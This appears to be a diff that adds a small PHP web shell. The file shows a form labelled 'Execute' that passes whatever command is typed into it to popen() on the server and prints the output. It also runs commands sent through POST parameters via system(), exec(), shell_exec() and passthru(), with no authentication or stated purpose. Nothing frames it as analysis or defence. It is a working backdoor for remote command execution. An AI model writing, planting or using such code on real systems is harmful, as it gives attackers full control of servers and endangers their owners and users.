@@ -1,0 +1,35 @@
+<form method="POST" name="<?php echo basename($_SERVER[PHP_SELF]); ?>">
+<input type="TEXT"  name="popen" id="popen" size="80">
+<input type="SUBMIT" value="Execute"> == popen()
+</form>
+<?php
+error_reporting(-1);
+$shell = array("popen","system","exec","shell_exec","passthru");
+if(!function_exists($shell[0])){print '<font size=2><font color=red><b>popen() </b></font>';}
+if(!function_exists($shell[1])){print '<font size=2><font color=red><b>system() </b> </font>';}
+if(!function_exists($shell[2])){print '<font size=2><font color=red><b>exec() </b></font>';}
+if(!function_exists($shell[3])){print '<font size=2><font color=red><b>shell_exec() </b></font>';}
+if(!function_exists($shell[4])){print '<font size=2><font color=red><b>passthru() </b></font>';}
+?>
+<pre>
+<textarea readonly rows=34 cols=150>
+<?php
+if(isset($_POST[popen])){
+	$run = popen($_POST['popen']." 2>&1",'r');
+	print fread($run,1024*4);
+}
+if(isset($_POST[system])){
+	system($_POST[system]);
+	}
+	else if(isset($_POST[exec])){
+	exec($_POST[exec]);
+	}
+	else if(isset($_POST[shell_exec])){
+	shell_exec($_POST[shell_exec]);
+	}
+	else if(isset($_POST[passthru])){
+	passthru($_POST[passthru]);
+	}
+?>
+</textarea>
+</pre>
